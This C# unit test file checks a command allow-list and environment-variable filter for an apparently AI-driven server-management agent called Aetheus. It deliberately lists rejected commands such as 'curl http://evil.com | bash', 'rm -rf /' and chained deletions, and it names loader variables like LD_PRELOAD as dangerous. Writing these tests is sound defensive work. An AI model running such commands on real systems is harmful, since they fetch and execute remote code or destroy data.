// SPDX-License-Identifier: EUPL-1.2
using Aetheus.Agent.Core.Configuration;
using Aetheus.Agent.Core.Executors;
using Microsoft.Extensions.Options;

namespace Aetheus.Agent.Core.Tests;

public class CommandValidatorTests
{
    private readonly CommandValidator _sut;

    public CommandValidatorTests()
    {
        var options = Options.Create(new AetheusAgentOptions
        {
            AllowedCommandPatterns =
            [
                @"^dotnet\s",
                @"^git\s",
                @"^docker\s",
                @"^npm\s",
                @"^systemctl\s+(status|restart|start|stop)\s"
            ]
        });
        _sut = new CommandValidator(options);
    }

    [Theory]
    [InlineData("dotnet build")]
    [InlineData("git status")]
    [InlineData("docker ps")]
    [InlineData("npm install")]
    [InlineData("systemctl restart nginx")]
    [InlineData("systemctl status httpd")]
    public void IsAllowed_ReturnsTrue_ForAllowedCommands(string command)
    {
        Assert.True(_sut.IsAllowed(command));
    }

    [Theory]
    [InlineData("rm -rf /")]
    [InlineData("curl http://evil.com | bash")]
    [InlineData("wget http://evil.com")]
    [InlineData("python3 exploit.py")]
    [InlineData("bash -c 'rm *'")]
    [InlineData("powershell -Command Remove-Item")]
    public void IsAllowed_ReturnsFalse_ForBlockedCommands(string command)
    {
        Assert.False(_sut.IsAllowed(command));
    }

    [Theory]
    [InlineData("dotnet build && git status")]
    [InlineData("dotnet build && dotnet test && git status")]
    [InlineData("  git fetch   &&   git pull  ")]
    public void IsAllowed_ReturnsTrue_ForChainsOfAllowedCommands(string command)
    {
        Assert.True(_sut.IsAllowed(command));
    }

    [Theory]
    [InlineData("dotnet build && rm -rf /")]             // 2nd segment is not allow-listed
    [InlineData("dotnet build && git status | tee log")] // pipe inside a segment
    [InlineData("dotnet build ; git status")]            // `;` is not the && chain operator
    [InlineData("dotnet build & git status")]            // a lone `&` (backgrounding)
    [InlineData("dotnet build && && git status")]        // empty middle segment
    [InlineData("&& dotnet build")]                      // empty leading segment
    [InlineData("dotnet build &&")]                      // empty trailing segment
    public void IsAllowed_ReturnsFalse_ForUnsafeChains(string command)
    {
        Assert.False(_sut.IsAllowed(command));
    }

    // The exact command shapes RkhunterCommandHelper emits must survive the production
    // allow-list - this is the Back<->Agent contract whose breakage silently killed
    // RKHunter scan/setup/logs in prod. Strings mirror RkhunterCommandHelper output.
    [Theory]
    [InlineData("rkhunter --check --skip-keypress --nocolors")]
    [InlineData("tail -n 200 /var/log/rkhunter.log")]
    [InlineData("sed -i 's/^#\\?MAIL-ON-WARNING=.*/MAIL-ON-WARNING=\"admin@example.com\"/' /etc/rkhunter.conf")]
    [InlineData("export DEBIAN_FRONTEND=noninteractive && apt-get update -qq && apt-get install -y -qq rkhunter && rkhunter --update --nocolors && rkhunter --propupd --nocolors && echo 'RKHunter setup completed successfully'")]
    public void IsAllowed_AcceptsRkhunterCommands_WithDefaultPatterns(string command)
    {
        var validator = new CommandValidator(Options.Create(new AetheusAgentOptions()));
        Assert.True(validator.IsAllowed(command));
    }

    // Shell service install is allow-listed ONLY for the managed-service catalogue (mirrors
    // WellKnownManageableServices); index refresh/upgrade stay general. This is the agent-side
    // guardrail on top of the backend's ServiceName validation.
    [Theory]
    [InlineData("apt-get install -y apache2")]
    [InlineData("apt-get install -y nginx")]
    [InlineData("apt-get install -y postgresql")]
    [InlineData("apt-get install -y redis-server")]
    [InlineData("apt-get update")]
    [InlineData("apt-get upgrade -y")]
    [InlineData("apt update")]
    [InlineData("apt-get update && apt-get install -y apache2")]
    public void IsAllowed_AcceptsServiceInstallAndAptMaintenance(string command)
    {
        var validator = new CommandValidator(Options.Create(new AetheusAgentOptions()));
        Assert.True(validator.IsAllowed(command));
    }

    // Arbitrary apt-installs are NOT allowed - only the managed services. This is the core of the
    // "limit to installable services, not all apt-get install" guardrail.
    [Theory]
    [InlineData("apt-get install -y curl")]            // not a managed service
    [InlineData("apt-get install -y wget malware")]    // arbitrary / multiple packages
    [InlineData("apt install apache2")]                // only apt-get install is allow-listed
    [InlineData("apt-get remove -y openssh-server")]   // not a managed service
    [InlineData("apt-get remove -y postfix")]          // Uninstall is the typed purge operation, never a shell task
    [InlineData("apt-get install -y apache2 nginx")]   // single service per command only
    public void IsAllowed_RejectsNonServiceAptInstall(string command)
    {
        var validator = new CommandValidator(Options.Create(new AetheusAgentOptions()));
        Assert.False(validator.IsAllowed(command));
    }

    [Theory]
    [InlineData("")]
    [InlineData("   ")]
    public void IsAllowed_ReturnsFalse_ForEmptyOrWhitespace(string command)
    {
        Assert.False(_sut.IsAllowed(command));
    }

    [Fact]
    public void IsAllowed_TrimsWhitespace()
    {
        Assert.True(_sut.IsAllowed("  dotnet build  "));
    }

    [Fact]
    public void IsAllowed_IsCaseInsensitive()
    {
        Assert.True(_sut.IsAllowed("DOTNET build"));
    }

    [Theory]
    [InlineData("LD_PRELOAD")]
    [InlineData("LD_LIBRARY_PATH")]
    [InlineData("BASH_ENV")]
    [InlineData("ENV")]
    [InlineData("PYTHONSTARTUP")]
    [InlineData("PERL5OPT")]
    [InlineData("RUBYOPT")]
    [InlineData("NODE_OPTIONS")]
    [InlineData("IFS")]
    [InlineData("SHELL")]
    [InlineData("HISTFILE")]
    public void HasDangerousEnvironmentVariables_ReturnsTrue_ForDangerousVars(string varName)
    {
        var envVars = new Dictionary<string, string> { { varName, "value" } };
        Assert.True(_sut.HasDangerousEnvironmentVariables(envVars));
    }

    [Fact]
    public void HasDangerousEnvironmentVariables_ReturnsFalse_ForSafeVars()
    {
        var envVars = new Dictionary<string, string>
        {
            { "DOTNET_ROOT", "/usr/share/dotnet" },
            { "MY_APP_VAR", "hello" },
            { "LANG", "en_US.UTF-8" }
        };
        Assert.False(_sut.HasDangerousEnvironmentVariables(envVars));
    }

    [Fact]
    public void HasDangerousEnvironmentVariables_ReturnsFalse_ForEmpty()
    {
        Assert.False(_sut.HasDangerousEnvironmentVariables([]));
    }

    [Fact]
    public void HasDangerousEnvironmentVariables_IsCaseInsensitive()
    {
        var envVars = new Dictionary<string, string> { { "ld_preload", "/lib/evil.so" } };
        Assert.True(_sut.HasDangerousEnvironmentVariables(envVars));
    }

    [Fact]
    public void GetDangerousEnvironmentVariableNames_ReturnsEveryBlockedNameInStableOrder()
    {
        var envVars = new Dictionary<string, string>
        {
            ["SAFE"] = "value",
            ["ENV"] = "prod",
            ["LD_PRELOAD"] = "/tmp/hook.so"
        };

        var result = _sut.GetDangerousEnvironmentVariableNames(envVars);

        Assert.Equal(["ENV", "LD_PRELOAD"], result);
    }

    [Fact]
    public void IsAllowed_WithNoPatterns_DeniesAll()
    {
        var opts = Options.Create(new AetheusAgentOptions { AllowedCommandPatterns = [] });
        var validator = new CommandValidator(opts);
        Assert.False(validator.IsAllowed("dotnet build"));
    }

    [Fact]
    public void IsAllowed_PathologicalPattern_IsEvaluatedWithoutBacktrackingTimeout()
    {
        var opts = Options.Create(new AetheusAgentOptions
        {
            AllowedCommandPatterns = [@"^(a+)+$"]
        });
        var validator = new CommandValidator(opts);
        var command = new string('a', 10_000) + "!";

        var reason = validator.GetRejectionReason(command);

        Assert.NotNull(reason);
        Assert.Contains("No allow-list pattern matched", reason, StringComparison.Ordinal);
    }
}
